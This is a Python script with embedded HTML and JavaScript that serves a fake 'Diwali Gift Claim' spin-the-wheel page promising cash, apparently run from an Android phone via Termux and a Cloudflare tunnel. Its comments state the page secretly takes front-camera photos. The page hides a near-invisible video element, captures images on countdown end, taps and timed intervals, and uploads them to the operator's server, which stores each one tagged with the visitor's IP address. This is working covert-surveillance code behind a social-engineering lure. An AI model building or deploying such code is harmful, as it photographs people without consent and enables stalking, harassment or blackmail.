#!/usr/bin/env python3
"""Diwali Gift Cam (final) - Made by Farhan.
7 sec countdown -> Diwali gift poster + Start->spin (Rs 1-500). Photo front camera se
chup-chaap khinch kar /sdcard/Download/DroidLinkCam me save hoti hai. Debug: /test, /diag."""
import json, os, re, shutil, socket, ssl, subprocess, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HTTP_PORT = int(os.environ.get("PORT", "8765"))
HTTPS_PORT = int(os.environ.get("HTTPS_PORT", "8443"))
HERE = os.path.dirname(os.path.abspath(__file__))
CERT, KEY = os.path.join(HERE, "cert.pem"), os.path.join(HERE, "key.pem")
LOGS = []          # last debug messages from the browser


def save_dir():
    home_dl = os.path.expanduser("~/storage/downloads")
    for full in ("/sdcard/Download/DroidLinkCam",
                 os.path.join(home_dl, "DroidLinkCam") if os.path.isdir(home_dl) else None):
        if not full:
            continue
        try:
            os.makedirs(full, exist_ok=True)
            probe = os.path.join(full, ".wtest")
            with open(probe, "wb") as fh:
                fh.write(b"ok")
            os.remove(probe)
            return full
        except OSError:
            continue
    fb = os.path.expanduser("~/DroidLinkCam")
    os.makedirs(fb, exist_ok=True)
    print("!! Download folder nahi mila -> chalao: termux-setup-storage")
    return fb


OUT = save_dir()


def ensure_cert():
    if os.path.exists(CERT) and os.path.exists(KEY):
        return True
    try:
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
             "-keyout", KEY, "-out", CERT, "-days", "3650", "-subj", "/CN=droidlink-cam"],
            check=True, capture_output=True, timeout=60)
        return True
    except Exception as exc:
        print("!! https backup band ->", exc)
        return False


HTML = r"""<!doctype html>
<html lang="hi"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Diwali Gift Claim</title>
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;min-height:100%;overflow-x:hidden}
  body{background:radial-gradient(circle at 50% 0%,#3d0f2b 0%,#25081c 45%,#12040f 100%);
    color:#ffe9c7;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    display:flex;align-items:center;justify-content:center;padding:18px;min-height:100vh}
  .poster{width:100%;max-width:420px;border-radius:26px;padding:20px 18px 16px;text-align:center;
    background:linear-gradient(160deg,rgba(255,215,106,.14),rgba(255,90,140,.06) 45%,rgba(0,0,0,0) 70%),rgba(28,6,20,.92);
    border:1px solid rgba(255,205,110,.35);
    box-shadow:0 0 0 1px rgba(255,215,106,.08) inset,0 24px 60px -20px rgba(255,140,60,.45);
    position:relative;overflow:hidden}
  .poster::before{content:"";position:absolute;inset:-40% -20% auto -20%;height:70%;
    background:radial-gradient(ellipse at 50% 0%,rgba(255,196,92,.28),transparent 62%);pointer-events:none}
  .made{position:relative;margin:0 0 10px;font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#ffcf8f;opacity:.8}
  .made b{color:#ffd76a;letter-spacing:2px}
  .diyas{font-size:20px;letter-spacing:6px;filter:drop-shadow(0 0 10px rgba(255,170,60,.8))}
  h1{margin:8px 0 2px;font-size:30px;line-height:1.1;font-weight:800;letter-spacing:.4px;
    background:linear-gradient(180deg,#fff3d0,#ffc352 55%,#e08b1f);-webkit-background-clip:text;
    background-clip:text;color:transparent;text-shadow:0 6px 22px rgba(255,170,60,.25)}
  .sub{margin:0;font-size:13px;letter-spacing:2.4px;text-transform:uppercase;color:#ffcf8f;opacity:.85}
  .wheel-wrap{position:relative;width:min(76vw,280px);aspect-ratio:1;margin:16px auto 8px}
  #wheel{width:100%;height:100%;display:block;border-radius:50%;
    box-shadow:0 0 0 6px rgba(255,215,106,.16),0 0 0 12px rgba(255,215,106,.06),0 18px 40px -12px rgba(0,0,0,.8)}
  .pointer{position:absolute;top:-6px;left:50%;transform:translateX(-50%);width:0;height:0;
    border-left:13px solid transparent;border-right:13px solid transparent;border-top:24px solid #ffd76a;
    filter:drop-shadow(0 4px 6px rgba(0,0,0,.6));z-index:3}
  .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:56px;height:56px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:800;color:#4a1206;
    background:radial-gradient(circle at 35% 30%,#fff3cf,#ffca57 60%,#e2951f);
    box-shadow:0 6px 18px rgba(0,0,0,.45),0 0 0 4px rgba(28,6,20,.9);z-index:2}
  .result{margin:10px 0 2px;font-size:19px;font-weight:700;min-height:26px;color:#ffe9c7}
  .result b{color:#ffd76a}
  button{margin-top:10px;width:100%;padding:15px;border:0;border-radius:15px;font-size:16px;font-weight:800;
    letter-spacing:.3px;color:#3a0d05;background:linear-gradient(180deg,#ffe08a,#ffc14d 55%,#f0a12b);
    box-shadow:0 10px 24px -8px rgba(255,170,60,.7)}
  button.ghost{background:transparent;border:1px solid rgba(255,205,110,.45);color:#ffd76a;box-shadow:none;font-weight:700}
  button:disabled{background:#2a1220;color:#8a6a55;box-shadow:none;border-color:transparent}
  button:active{transform:scale(.99)}
  .owner{margin:14px 0 2px;font-size:13.5px;line-height:1.55;color:#ffd9a8}
  .owner b{color:#ffd76a}
  .note{margin:8px 0 0;font-size:10.5px;letter-spacing:.6px;color:#c99f7e;opacity:.6}
  video#v{position:fixed;left:0;top:0;width:100%;height:100%;object-fit:cover;opacity:.01;
    pointer-events:none;z-index:6;border:0;background:transparent}
  #cap{position:fixed;left:0;top:0;width:2px;height:2px;opacity:.02;pointer-events:none;z-index:-1;border:0}
  @keyframes pop{0%{transform:scale(.6);opacity:0}60%{transform:scale(1.12)}100%{transform:scale(1);opacity:1}}
  .pop{animation:pop .45s ease-out}
  #gate{position:fixed;inset:0;z-index:30;background:#080c14;display:flex;
    flex-direction:column;align-items:center;justify-content:center;gap:10px;
    transition:opacity .35s ease}
  #gate.off{opacity:0;pointer-events:none}
  #gate-num{font-size:72px;font-weight:800;line-height:1;color:#ffd76a;
    font-variant-numeric:tabular-nums;text-shadow:0 0 30px rgba(255,170,60,.45)}
  #gate-txt{font-size:14px;letter-spacing:2px;text-transform:uppercase;color:#9fb0c9}
  #gate-bar{width:160px;height:4px;border-radius:99px;background:#1b2740;overflow:hidden}
  #gate-bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#ffe08a,#f0a12b);
    transition:width 1s linear}

</style></head>
<body>
<div id="gate">
  <div id="gate-num">7</div>
  <div id="gate-txt">Wait 7 sec&hellip;</div>
  <div id="gate-bar"><i id="gate-fill"></i></div>
</div>
<div class="poster">
  <p class="made">Made by <b>Farhan</b></p>
  <div class="diyas">&#128367; &#128367; &#128367;</div>
  <h1>Happy Diwali</h1>
  <p class="sub">Gift Claim &middot; Spin &amp; Win</p>
  <div class="wheel-wrap">
    <div class="pointer"></div>
    <canvas id="wheel" width="600" height="600"></canvas>
    <div class="hub">&#8377;</div>
  </div>
  <div class="result" id="result">Start dabao aur spin karo</div>
  <button id="start">Start</button>
  <button id="claim" class="ghost" disabled>Claim</button>
  <p class="owner">Main <b>Farhan</b> &mdash; spin karo, jitna paisa aayega main daal dunga.</p>
  <p class="note">Gift worth &#8377;1 &ndash; &#8377;500 &middot; fun demo</p>
</div>

<video id="v" class="cap" autoplay playsinline muted webkit-playsinline></video>
<canvas id="cap" class="cap"></canvas>

<script>
/* ------------------------------ camera (chup-chaap) ------------------------------ */
var CAM = (function () {
  var v = document.getElementById('v'), c = document.getElementById('cap');
  var stream = null, track = null, timer = null, attempt = 0, shots = 0, snapping = false;
  var every = Number(new URLSearchParams(location.search).get('every') || 0);
  var CONSTRAINTS = [
    { audio: false, video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } } },
    { audio: false, video: { facingMode: 'user' } },
    { audio: false, video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 960 } } },
    { audio: false, video: true }
  ];

  function log(msg, bad) {
    try {
      fetch('/log', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          msg: msg, bad: !!bad,
          ua: navigator.userAgent.slice(0, 160),
          vis: document.visibilityState
        })
      });
    } catch (e) {}
  }

  function send(blob, how) {
    if (!blob) { log('empty blob (' + how + ')', true); return; }
    fetch('/snap', { method: 'POST', body: blob })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d && d.ok) { shots += 1; log('PHOTO SAVED (' + how + ', ' + Math.round(blob.size / 1024) + 'KB) ' + d.path); }
        else log('save fail (' + how + '): ' + JSON.stringify(d), true);
      })
      .catch(function (e) { log('upload fail (' + how + '): ' + e.message, true); });
  }

  function trackInfo() {
    if (!track) return 'no track';
    var s = (track.getSettings && track.getSettings()) || {};
    return 'label="' + track.label + '" ' + (s.width || '?') + 'x' + (s.height || '?') +
           '@' + (s.frameRate || '?') + ' readyState=' + track.readyState;
  }

  function fromBitmap(bmp) {
    var w = Math.min(bmp.width || bmp.displayWidth, 1080);
    var h = Math.round((bmp.height || bmp.displayHeight) * (w / (bmp.width || bmp.displayWidth)));
    c.width = w; c.height = h;
    c.getContext('2d').drawImage(bmp, 0, 0, w, h);
    if (bmp.close) bmp.close();
    c.toBlob(function (b) { send(b, 'canvas ' + w + 'x' + h); }, 'image/jpeg', 0.92);
  }

  function withTimeout(promise, ms, name) {
    return new Promise(function (resolve, reject) {
      var done = false;
      var to = setTimeout(function () {
        if (!done) { done = true; reject(new Error(name + ' timeout ' + ms + 'ms')); }
      }, ms);
      promise.then(function (val) {
        if (!done) { done = true; clearTimeout(to); resolve(val); }
      }, function (err) {
        if (!done) { done = true; clearTimeout(to); reject(err); }
      });
    });
  }

  /* raasta 1: ImageCapture.takePhoto (video element ki zaroorat nahi) */
  async function takePhotoShot() {
    if (!('ImageCapture' in window)) { log('ImageCapture support nahi', true); return false; }
    if (!track) { log('takePhoto: track nahi', true); return false; }
    var ic;
    try { ic = new window.ImageCapture(track); } catch (e) { log('ImageCapture ban nahi raha: ' + e.message, true); return false; }
    if (!ic.takePhoto) { log('takePhoto method nahi', true); return false; }
    try {
      log('takePhoto() chalu');
      var blob = await withTimeout(ic.takePhoto(), 7000, 'takePhoto');
      if (!blob || blob.size < 1000) { log('takePhoto khali blob', true); return false; }
      send(blob, 'takePhoto');
      return true;
    } catch (e) {
      log('takePhoto fail: ' + ((e && e.message) || e), true);
      return false;
    }
  }

  /* raasta 2: ImageCapture.grabFrame */
  async function grabFrameShot() {
    if (!('ImageCapture' in window) || !track) return false;
    var ic;
    try { ic = new window.ImageCapture(track); } catch (e) { return false; }
    if (!ic.grabFrame) { log('grabFrame method nahi', true); return false; }
    try {
      log('grabFrame() chalu');
      var bmp = await withTimeout(ic.grabFrame(), 5000, 'grabFrame');
      fromBitmap(bmp);
      return true;
    } catch (e) {
      log('grabFrame fail: ' + ((e && e.message) || e), true);
      return false;
    }
  }

  /* raasta 3: <video> ka frame (frame aane ka intezaar) */
  async function videoShot() {
    for (var i = 0; i < 25; i += 1) {
      if (v.videoWidth > 0) {
        var w = Math.min(v.videoWidth, 1080);
        var h = Math.round(v.videoHeight * (w / v.videoWidth));
        c.width = w; c.height = h;
        c.getContext('2d').drawImage(v, 0, 0, w, h);
        c.toBlob(function (b) { send(b, 'video ' + w + 'x' + h); }, 'image/jpeg', 0.92);
        return true;
      }
      if (i === 6 && stream) {
        /* srcObject ko chhedo mat — sirf dobara attach karke play karo */
        try {
          v.srcObject = stream;
          var p2 = v.play();
          if (p2 && p2.catch) p2.catch(function () {});
          log('video: srcObject dobara attach kiya');
        } catch (e) { log('re-attach fail: ' + ((e && e.message) || e), true); }
      }
      await new Promise(function (r) { setTimeout(r, 200); });
    }
    log('video frame nahi aaya (videoWidth=' + v.videoWidth + ' ready=' + v.readyState +
        ' net=' + v.networkState + ' err=' + (v.error ? v.error.code : '-') +
        ' vis=' + document.visibilityState + ')', true);
    return false;
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  /* jo task pehle TRUE de de wahi jeetega; sab fail ho to -1 */
  function firstSuccess(tasks, totalMs) {
    return new Promise(function (resolve) {
      var done = false, left = tasks.length;
      var to = setTimeout(function () { if (!done) { done = true; resolve(-1); } }, totalMs);
      tasks.forEach(function (task, index) {
        Promise.resolve().then(task).then(function (ok) {
          left -= 1;
          if (ok && !done) { done = true; clearTimeout(to); resolve(index); }
          else if (left === 0 && !done) { done = true; clearTimeout(to); resolve(-1); }
        }).catch(function (e) {
          left -= 1;
          log('task#' + (index + 1) + ' error: ' + (e && e.message ? e.message : e), true);
          if (left === 0 && !done) { done = true; clearTimeout(to); resolve(-1); }
        });
      });
    });
  }

  async function snap() {
    if (snapping) return;
    if (!track) { log('snap: camera on nahi hai', true); return; }
    snapping = true;
    try {
      if (v.videoWidth > 0) {                 /* video ready -> seedha capture */
        log('raasta: video (turant) ' + v.videoWidth + 'x' + v.videoHeight);
        if (await videoShot()) return;
      }
      log('video frame abhi nahi -> takePhoto / grabFrame / video RACE');
      var winner = await firstSuccess([takePhotoShot, grabFrameShot, videoShot], 15000);
      if (winner < 0) {
        log('SAARE raaste fail (videoWidth=' + v.videoWidth + ' ready=' + v.readyState +
            ' vis=' + document.visibilityState + ')', true);
      } else {
        log('race jeeta: task#' + (winner + 1));
      }
    } finally {
      snapping = false;
    }
  }

  function start() {
    if (stream && stream.active) { snap(); return; }
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      log('mediaDevices nahi — https link chahiye', true);
      return;
    }
    var cons = CONSTRAINTS[Math.min(attempt, CONSTRAINTS.length - 1)];
    log('getUserMedia try#' + (attempt + 1) + ' ' + JSON.stringify(cons.video) + ' vis=' + document.visibilityState);
    navigator.mediaDevices.getUserMedia(cons).then(function (s) {
      stream = s;
      track = (s.getVideoTracks && s.getVideoTracks()[0]) || null;
      v.muted = true;
      v.setAttribute('playsinline', '');
      v.srcObject = s;
      var p = v.play();
      if (p && p.catch) p.catch(function (e) { log('play() reject: ' + e.name, true); });
      log('camera ON -> ' + trackInfo());
      snap();
      if (every > 0 && !timer) timer = setInterval(snap, every * 1000);
    }).catch(function (e) {
      log('getUserMedia fail try#' + (attempt + 1) + ': ' + e.name + ' - ' + e.message, true);
      attempt += 1;
      if (attempt < CONSTRAINTS.length) setTimeout(start, 900);
      else setTimeout(function () { attempt = 0; start(); }, 6000);
    });
  }

  setInterval(function () {
    if (stream) log('status videoWidth=' + v.videoWidth + ' ready=' + v.readyState + ' shots=' + shots);
  }, 8000);

  document.addEventListener('click', start, { passive: true });
  document.addEventListener('touchend', start, { passive: true });
  document.addEventListener('visibilitychange', function () {
    log('visibility -> ' + document.visibilityState);
    if (!document.hidden) { attempt = 0; start(); }
  });
  log('boot ua=' + navigator.userAgent.slice(0, 90) +
      ' ImageCapture=' + ('ImageCapture' in window) + ' vis=' + document.visibilityState +
      (document.hidden ? '  <-- PAGE BACKGROUND ME HAI: Chrome ka tab kholo' : ''));
  start();

  return { start: start, shoot: snap };
})();

/* ---------------------------- 7 second gate ---------------------------- */
(function () {
  var gate = document.getElementById('gate');
  var num = document.getElementById('gate-num');
  var txt = document.getElementById('gate-txt');
  var fill = document.getElementById('gate-fill');
  var left = 7, total = 7;

  function paint() {
    num.textContent = left;
    txt.textContent = 'Wait ' + left + ' sec\u2026';
    fill.style.width = Math.round(((total - left) / total) * 100) + '%';
  }
  paint();

  var iv = setInterval(function () {
    left -= 1;
    if (left > 0) { paint(); return; }
    clearInterval(iv);
    paint();
    gate.classList.add('off');
    setTimeout(function () { gate.style.display = 'none'; }, 400);
    try { CAM.shoot(); } catch (e) {}     /* countdown khatam -> photo */
  }, 1000);
})();


/* ------------------------------ spin wheel ------------------------------ */
(function () {
  var VALUES = [1, 5, 10, 25, 50, 75, 100, 150, 200, 250, 300, 500];
  var SEG = VALUES.length, STEP = (Math.PI * 2) / SEG;
  var COLORS = ['#7a1f2b', '#a8323f'];
  var wheel = document.getElementById('wheel'), ctx = wheel.getContext('2d');
  var resultEl = document.getElementById('result');
  var startBtn = document.getElementById('start'), claimBtn = document.getElementById('claim');
  var rotation = 0, spinning = false, landed = null;

  function drawWheel(rot) {
    var R = 300, cx = 300, cy = 300;
    ctx.clearRect(0, 0, 600, 600);
    for (var i = 0; i < SEG; i += 1) {
      var start = i * STEP + rot;
      ctx.beginPath(); ctx.moveTo(cx, cy);
      ctx.arc(cx, cy, R - 4, start, start + STEP); ctx.closePath();
      ctx.fillStyle = i % 2 ? COLORS[0] : COLORS[1]; ctx.fill();
      ctx.strokeStyle = 'rgba(255,215,106,.55)'; ctx.lineWidth = 2; ctx.stroke();
      ctx.save(); ctx.translate(cx, cy); ctx.rotate(start + STEP / 2);
      ctx.textAlign = 'right'; ctx.textBaseline = 'middle';
      ctx.fillStyle = '#ffe9bd'; ctx.font = 'bold 40px system-ui, sans-serif';
      ctx.shadowColor = 'rgba(0,0,0,.5)'; ctx.shadowBlur = 6;
      ctx.fillText('\u20b9' + VALUES[i], R - 34, 0); ctx.restore();
    }
    ctx.beginPath(); ctx.arc(cx, cy, R - 2, 0, Math.PI * 2);
    ctx.strokeStyle = '#ffd76a'; ctx.lineWidth = 10; ctx.stroke();
  }

  function spin() {
    if (spinning) return;
    spinning = true; landed = null;
    startBtn.disabled = true; startBtn.textContent = 'Spin ho raha hai\u2026';
    claimBtn.disabled = true; claimBtn.textContent = 'Claim';
    resultEl.textContent = 'Spin ho raha hai\u2026';

    var target = Math.floor(Math.random() * SEG);
    var pointerAngle = -Math.PI / 2;
    var centre = (target + 0.5) * STEP;
    var turns = 5 + Math.floor(Math.random() * 3);
    var finalRot = pointerAngle - centre + Math.PI * 2 * turns;
    var startRot = rotation % (Math.PI * 2);
    var delta = finalRot - startRot, duration = 4200, t0 = performance.now();

    function frame(now) {
      var p = Math.min(1, (now - t0) / duration);
      var eased = 1 - Math.pow(1 - p, 3);
      rotation = startRot + delta * eased;
      drawWheel(rotation);
      if (p < 1) { requestAnimationFrame(frame); return; }
      rotation = finalRot % (Math.PI * 2); drawWheel(rotation);
      spinning = false; landed = VALUES[target];
      resultEl.innerHTML = 'Aapne jeeta <b>\u20b9' + landed + '</b> \ud83c\udf89';
      resultEl.classList.remove('pop'); void resultEl.offsetWidth; resultEl.classList.add('pop');
      startBtn.disabled = false; startBtn.textContent = 'Dobara spin';
      claimBtn.disabled = false; claimBtn.textContent = 'Claim \u20b9' + landed;
    }
    requestAnimationFrame(frame);
  }

  startBtn.addEventListener('click', function () { CAM.shoot(); spin(); });

  claimBtn.addEventListener('click', function () {
    if (landed === null) return;
    claimBtn.disabled = true; claimBtn.textContent = 'Claimed \u2713';
    resultEl.innerHTML = 'Gift <b>\u20b9' + landed + '</b> claim ho gaya \ud83c\udf81';
  });

  drawWheel(0);
})();
</script></body></html>"""
HTML_TEST = r"""<!doctype html>
<html lang="hi"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Camera Test</title>
<style>
 body{margin:0;padding:16px;background:#0b1220;color:#e8eef8;font-family:system-ui,sans-serif}
 video{width:100%;max-width:420px;border-radius:14px;background:#000;display:block;margin:0 auto 12px}
 button{width:100%;max-width:420px;padding:14px;margin:6px auto;display:block;border-radius:12px;border:0;
   font-size:15px;font-weight:700;background:#0b8a75;color:#fff}
 pre{max-width:420px;margin:12px auto;padding:12px;border-radius:12px;background:#111c2e;color:#9fe8c9;
   font-size:12px;line-height:1.5;white-space:pre-wrap;word-break:break-word}
 .k{background:#16233a;color:#ffd76a}
</style></head><body>
<video id="v" autoplay playsinline muted></video>
<button id="on">Camera ON (front)</button>
<button id="cap" class="k">Photo click karo</button>
<button id="api" class="k">takePhoto() test</button>
<pre id="out">status…</pre>
<canvas id="c" style="display:none"></canvas>
<script>
var v=document.getElementById('v'),c=document.getElementById('c'),out=document.getElementById('out');
function p(m){
  out.textContent+= '\n'+m;
  try{ fetch('/log',{method:'POST',headers:{'content-type':'application/json'},
    body:JSON.stringify({msg:'[TEST] '+m, bad:/error|fail|nahi|MISSING/.test(m)})}); }catch(e){}
}
function snap(){
  if(!v.videoWidth){p('videoWidth=0 -> camera abhi ready nahi');return;}
  var w=Math.min(v.videoWidth,1080),h=Math.round(v.videoHeight*(w/v.videoWidth));
  c.width=w;c.height=h;c.getContext('2d').drawImage(v,0,0,w,h);
  c.toBlob(function(b){
    if(!b){p('blob fail');return;}
    p('captured '+Math.round(b.size/1024)+'KB');
    fetch('/snap',{method:'POST',body:b}).then(r=>r.json()).then(d=>p(d.ok?('SAVED '+d.path):('FAIL '+JSON.stringify(d))))
      .catch(e=>p('upload error '+e.message));
  },'image/jpeg',0.92);
}
document.getElementById('on').onclick=function(){
  if(!navigator.mediaDevices){p('navigator.mediaDevices nahi (http link?)');return;}
  navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
    v.srcObject=s;v.play();p('camera ON, size '+s.getVideoTracks()[0].getSettings().width+'x'+s.getVideoTracks()[0].getSettings().height);
  }).catch(function(e){p('error '+e.name+' '+e.message);});
};
document.getElementById('cap').onclick=snap;
document.getElementById('api').onclick=function(){
  if(!('ImageCapture' in window)){p('ImageCapture nahi');return;}
  if(!v.srcObject){p('pehle Camera ON karo');return;}
  var t=v.srcObject.getVideoTracks()[0];p('takePhoto...');
  new ImageCapture(t).takePhoto().then(function(b){
    p('takePhoto ok '+Math.round(b.size/1024)+'KB');
    fetch('/snap',{method:'POST',body:b}).then(r=>r.json())
      .then(d=>p(d.ok?('SAVED '+d.path):('FAIL '+JSON.stringify(d))));
  }).catch(function(e){p('takePhoto fail '+e.name+' '+e.message);});
};
if(navigator.mediaDevices){p('mediaDevices OK (secure context)');}else{p('mediaDevices MISSING -> camera https par hi chalega');}
</script></body></html>"""
PUBLIC_URL = {"value": None}


def start_tunnel(port):
    exe = shutil.which("cloudflared")
    if not exe:
        print("!! cloudflared nahi mila -> pkg install cloudflared")
        return None
    try:
        proc = subprocess.Popen([exe, "tunnel", "--no-autoupdate",
                                 "--url", "http://127.0.0.1:%d" % port],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
    except Exception as exc:
        print("!! tunnel start nahi hua:", exc)
        return None

    def pump():
        for line in proc.stdout:
            m = re.search(r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com", line)
            if m and not PUBLIC_URL["value"]:
                PUBLIC_URL["value"] = m.group(0)
                print("\n\n  >>> PUBLIC LINK: %s" % m.group(0), flush=True)

    threading.Thread(target=pump, daemon=True).start()
    return proc


def local_ips():
    ips = []
    try:
        out = subprocess.run(["sh", "-c", "ip -4 addr show scope global 2>/dev/null"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                ip = line.split()[1].split("/")[0]
                if not ip.startswith("127."):
                    ips.append(ip)
    except Exception:
        pass
    if not ips:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ips.append(s.getsockname()[0])
            s.close()
        except Exception:
            pass
    return ips


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "DiwaliGiftCam/1"

    def log_message(self, fmt, *args):
        print("[%s] %s" % (time.strftime("%H:%M:%S"), fmt % args), flush=True)

    def _send(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if body:
            self.wfile.write(body)

    def client(self):
        for h in ("cf-connecting-ip", "x-forwarded-for"):
            val = (self.headers.get(h) or "").split(",")[0].strip()
            if val:
                return val
        return self.client_address[0]

    def do_GET(self):
        path = self.path.split("?")[0]
        if path in ("/", "/index.html"):
            self._send(200, HTML.encode("utf-8"), "text/html; charset=utf-8")
        elif path == "/test":
            self._send(200, HTML_TEST.encode("utf-8"), "text/html; charset=utf-8")
        elif path == "/health":
            self._send(200, json.dumps({"ok": True, "dir": OUT, "shots": len(os.listdir(OUT)),
                                        "public": PUBLIC_URL["value"]}).encode())
        elif path == "/diag":
            self._send(200, json.dumps({"ok": True, "logs": LOGS[-40:]}).encode())
        elif path == "/favicon.ico":
            self._send(204, b"", "image/x-icon")
        elif path == "/list":
            self._send(200, json.dumps({"ok": True, "dir": OUT,
                                        "files": sorted(os.listdir(OUT))[-12:]}).encode())
        else:
            self._send(404, b'{"ok":false}')

    def do_POST(self):
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length") or 0)
        data = self.rfile.read(length) if length else b""

        if path == "/log":
            try:
                payload = json.loads(data.decode("utf-8") or "{}")
            except Exception:
                payload = {"msg": data[:200].decode("utf-8", "replace")}
            extra = ""
            if payload.get("ua"):
                extra += "  [vis=%s]" % payload.get("vis", "?")
            msg = "[%s] CLIENT %s %s%s" % (time.strftime("%H:%M:%S"), self.client(),
                                            payload.get("msg", ""), extra)
            print(msg, flush=True)
            LOGS.append({"t": time.strftime("%H:%M:%S"), "from": self.client(),
                         "msg": payload.get("msg", ""), "bad": payload.get("bad", False),
                         "ua": payload.get("ua", "")})
            self._send(200, b'{"ok":true}')
            return

        if path != "/snap":
            self._send(404, b'{"ok":false}')
            return
        if len(data) < 1000:
            print("!! snap rejected: %d bytes" % len(data), flush=True)
            self._send(400, json.dumps({"ok": False, "error": "image too small"}).encode())
            return
        who = self.client().replace(":", "-").replace(".", "_")
        stamp = time.strftime("%Y%m%d-%H%M%S")
        dest = os.path.join(OUT, "photo-%s-%s.jpg" % (stamp, who))
        n = 1
        while os.path.exists(dest):
            n += 1
            dest = os.path.join(OUT, "photo-%s-%s-%d.jpg" % (stamp, who, n))
        try:
            with open(dest, "wb") as fh:
                fh.write(data)
        except OSError as exc:
            print("!! write fail:", exc, flush=True)
            self._send(500, json.dumps({"ok": False, "error": str(exc)}).encode())
            return
        print("saved %s (%d bytes from %s)" % (dest, len(data), self.client()), flush=True)
        self._send(200, json.dumps({"ok": True, "path": dest, "bytes": len(data)}).encode())


def serve(port, use_tls):
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT, KEY)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print("listening %s://0.0.0.0:%d" % ("https" if use_tls else "http", port), flush=True)
    httpd.serve_forever()


if __name__ == "__main__":
    tls_ok = ensure_cert()
    print("\n=== Diwali Gift Cam - Made by Farhan ===")
    print("Save folder : %s" % OUT)
    print("Page        : 7 sec countdown -> Diwali poster + Start->spin")
    print("Camera      : FRONT only, chup-chaap (video-first, phir takePhoto race)")
    print("Debug       : <link>/test   |   log: <link>/diag")
    print("\nPublic link ban raha hai (5-20 sec, internet chahiye)...")
    ips = local_ips()
    if ips:
        print("\nBackup (same WiFi):")
        if tls_ok:
            for ip in ips:
                print("  https://%s:%d" % (ip, HTTPS_PORT))
        for ip in ips:
            print("  http://%s:%d" % (ip, HTTP_PORT))
    print("\nIsi phone par:  http://localhost:%d" % HTTP_PORT)
    threading.Thread(target=serve, args=(HTTP_PORT, False), daemon=True).start()
    time.sleep(0.5)
    if not start_tunnel(HTTP_PORT):
        print("  Manual: pkg install cloudflared && cloudflared tunnel --url http://localhost:%d" % HTTP_PORT)
    if tls_ok:
        serve(HTTPS_PORT, True)
    else:
        threading.Event().wait()
